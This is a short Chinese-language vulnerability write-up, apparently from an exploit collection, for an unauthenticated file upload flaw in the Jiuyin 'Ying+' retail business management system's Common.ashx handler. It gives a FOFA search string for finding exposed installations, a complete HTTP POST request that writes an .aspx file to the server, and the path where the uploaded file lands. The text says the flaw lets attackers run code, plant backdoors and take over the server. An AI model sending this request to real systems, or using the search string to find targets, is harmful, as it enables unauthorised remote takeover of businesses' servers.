# 九垠赢商业管理系统Common.ashx存在文件上传漏洞
成都和力九垠科技有限公司成立于1999年，是一家专业从事零售业全流程解决方案的高科技公司，总部位于四川成都。多年来，九垠软件不忘初衷，一直致力于中国零售企业的成长与发展，为广大客户提供优秀的零售商业管理软件与优质的金牌售后服务。经过多年的积累与发展，九垠科技已成为中国零售企业管理信息化的领导品牌。

九垠赢+商业管理系统 Common.ashx 存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```rust
"九垠赢"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1735477150841-8d8d1019-2950-4949-bd1c-b1d1e3d704f8.png)

## poc
```rust
POST /System/Common.ashx?type=savefile&path=test.aspx HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6

--WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="content";
Content-Type: text/plain

testupload
--WebKitFormBoundaryHHaZAYecVOf5sfa6--
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1735567254760-73f40ebe-e194-443c-ae77-0eba4097f52e.png)

上传位置

```plain
/System/test.aspx
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1735567239364-47dda596-ade7-40ed-89a9-80e60eac5a14.png)

